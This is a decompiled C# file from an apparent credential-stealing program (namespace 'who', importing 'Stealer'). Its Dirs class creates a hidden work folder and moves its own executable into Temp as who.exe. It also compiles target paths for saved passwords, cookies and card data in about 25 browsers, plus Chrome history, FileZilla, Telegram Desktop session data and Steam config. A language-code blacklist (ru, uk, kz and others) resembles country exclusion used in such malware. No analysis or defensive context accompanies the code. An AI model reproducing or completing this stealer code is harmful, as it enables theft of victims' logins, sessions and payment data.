using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using Microsoft.Win32;
using Stealer;

namespace who
{
	// Token: 0x02000028 RID: 40
	public class Dirs
	{
		// Token: 0x0600014F RID: 335 RVA: 0x0000BB40 File Offset: 0x00009D40
		public static void WorkDirCreate()
		{
			Console.WriteLine("DIR " + Dirs.WorkDir + " Created!");
			DirectoryInfo directoryInfo = Directory.CreateDirectory(Dirs.WorkDir);
			directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
		}

		// Token: 0x06000150 RID: 336 RVA: 0x0000BB7C File Offset: 0x00009D7C
		public static void Move()
		{
			if (File.Exists(Dirs.Temp + "\\who.exe"))
			{
				try
				{
					File.Delete(Dirs.Temp + "\\who.exe");
				}
				catch
				{
				}
			}
			try
			{
				File.Move(Directory.GetCurrentDirectory() + "\\" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name, Dirs.Temp + "\\who.exe");
			}
			catch
			{
			}
		}

		// Token: 0x06000151 RID: 337 RVA: 0x0000276F File Offset: 0x0000096F
		public Dirs()
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
		}

		// Token: 0x06000152 RID: 338 RVA: 0x0000BC1C File Offset: 0x00009E1C
		// Note: this type is marked as 'beforefieldinit'.
		static Dirs()
		{
			Class34.A1SfXVPz7w9eh();
			Dirs.Temp = Environment.GetEnvironmentVariable("Temp");
			Dirs.LocalAppData = Environment.GetEnvironmentVariable("LocalAppData");
			Dirs.AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Dirs.Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			Dirs.Documents = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			Dirs.UserName = Environment.UserName;
			Dirs.WorkDir = Program.path;
			Dirs.FileZilla = Dirs.AppData + "\\FileZilla";
			Dirs.TelegramDesktop = Dirs.AppData + "\\Telegram Desktop\\tdata\\D877F783D5D3EF8C";
			Dirs.Steam = (string)Registry.GetValue("HKEY_CURRENT_USER\\SOFTWARE\\Valve\\Steam", "Steampath", null);
			Dirs.Config = Dirs.Steam + "\\config";
			Dirs.SteamDir = Dirs.WorkDir + "\\Steam";
			Dirs.LoginData = "Login Data";
			Dirs.BrowsPass = new string[]
			{
				Dirs.LocalAppData + "\\Google\\Chrome\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.AppData + "\\Opera Software\\Opera Stable\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Kometa\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Orbitum\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Amigo\\User\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Torch\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\CentBrowser\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Go!\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\uCozMedia\\Uran\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\BlackHawk\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\AcWebBrowser\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\CoolNovo\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Epic Browser\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Baidu Spark\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Rockmelt\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Sleipnir\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\SRWare Iron\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Titan Browser\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Flock\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Vivaldi\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Sputnik\\User Data\\Default\\" + Dirs.LoginData,
				Dirs.LocalAppData + "\\Maxthon\\User Data\\Default\\" + Dirs.LoginData
			};
			Dirs.cookies = "Cookies";
			Dirs.BrowsCookies = new string[]
			{
				Dirs.LocalAppData + "\\Google\\Chrome\\User Data\\Default\\" + Dirs.cookies,
				Dirs.AppData + "\\Opera Software\\Opera Stable\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Kometa\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Orbitum\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Amigo\\User\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Torch\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\CentBrowser\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Go!\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\uCozMedia\\Uran\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\BlackHawk\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\AcWebBrowser\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\CoolNovo\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Epic Browser\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Baidu Spark\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Rockmelt\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Sleipnir\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\SRWare Iron\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Titan Browser\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Flock\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Vivaldi\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Sputnik\\User Data\\Default\\" + Dirs.cookies,
				Dirs.LocalAppData + "\\Maxthon\\User Data\\Default\\" + Dirs.cookies
			};
			Dirs.WebData = "Web Data";
			Dirs.BrowsCC = new string[]
			{
				Dirs.LocalAppData + "\\Google\\Chrome\\User Data\\Default\\" + Dirs.WebData,
				Dirs.AppData + "\\Opera Software\\Opera Stable\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Kometa\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Orbitum\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Comodo\\Dragon\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Amigo\\User\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Torch\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\CentBrowser\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Go!\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\uCozMedia\\Uran\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\MapleStudio\\ChromePlus\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Yandex\\YandexBrowser\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\BlackHawk\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\AcWebBrowser\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\CoolNovo\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Epic Browser\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Baidu Spark\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Rockmelt\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Sleipnir\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\SRWare Iron\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Titan Browser\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Flock\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Vivaldi\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Sputnik\\User Data\\Default\\" + Dirs.WebData,
				Dirs.LocalAppData + "\\Maxthon\\User Data\\Default\\" + Dirs.WebData
			};
			Dirs.BrowsHistory = new string[]
			{
				Dirs.LocalAppData + "\\Google\\Chrome\\User Data\\Default\\History"
			};
			Dirs.BlackList = new string[]
			{
				"ru",
				"uk",
				"be",
				"kz",
				"ka",
				"ky",
				"uz"
			};
			Dirs.BrowsersName = new string[]
			{
				"Google Chrome",
				"Mozilla Firefox",
				"Opera Browser"
			};
			Dirs.LogPC = new List<string>();
		}

		// Token: 0x0400007D RID: 125
		public static string Temp;

		// Token: 0x0400007E RID: 126
		public static string LocalAppData;

		// Token: 0x0400007F RID: 127
		public static string AppData;

		// Token: 0x04000080 RID: 128
		public static string Desktop;

		// Token: 0x04000081 RID: 129
		public static string Documents;

		// Token: 0x04000082 RID: 130
		public static string UserName;

		// Token: 0x04000083 RID: 131
		public static string WorkDir;

		// Token: 0x04000084 RID: 132
		public static string FileZilla;

		// Token: 0x04000085 RID: 133
		public static string TelegramDesktop;

		// Token: 0x04000086 RID: 134
		public static string Steam;

		// Token: 0x04000087 RID: 135
		public static string Config;

		// Token: 0x04000088 RID: 136
		public static string SteamDir;

		// Token: 0x04000089 RID: 137
		public static string LoginData;

		// Token: 0x0400008A RID: 138
		public static string[] BrowsPass;

		// Token: 0x0400008B RID: 139
		public static string cookies;

		// Token: 0x0400008C RID: 140
		public static string[] BrowsCookies;

		// Token: 0x0400008D RID: 141
		public static string WebData;

		// Token: 0x0400008E RID: 142
		public static string[] BrowsCC;

		// Token: 0x0400008F RID: 143
		public static string[] BrowsHistory;

		// Token: 0x04000090 RID: 144
		public static string[] BlackList;

		// Token: 0x04000091 RID: 145
		public static string[] BrowsersName;

		// Token: 0x04000092 RID: 146
		public static List<string> LogPC;
	}
}
